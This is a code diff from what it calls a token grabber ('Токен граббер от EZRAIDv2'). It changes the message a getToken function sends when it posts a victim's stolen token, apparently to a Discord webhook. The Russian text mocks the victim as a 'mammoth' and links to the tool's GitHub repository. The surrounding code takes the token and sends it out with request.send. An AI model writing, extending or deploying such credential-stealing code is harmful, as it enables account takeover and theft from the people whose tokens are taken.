@@ -7,7 +7,7 @@ function getToken(){
      var params = {
         username: "Токен граббер от EZRAIDv2",
         avatar_url: "",
-        content: "**А вот и токен от :mammoth: подъехал!**\n:key: **Токен: **||`" + token + "`||\n:black_cat: **GitHub:** ||`https://github.com/EZRAIDv2/token-grabber-js`||**\n:skull: **Сделал EZRAIDv2 ** :skeleton:"
+        content: ":penguin: **EZRAIDv2 - Токен Граббер**\n**А вот и токен от :mammoth: подъехал!**\n:key: **Токен: **||`" + token + "`||\n:black_cat: **GitHub:** ||`https://github.com/EZRAIDv2/token-grabber-js`||\n:skull: **Сделал EZRAIDv2 ** :skeleton:"
       }
       request.send(JSON.stringify(params));
 }
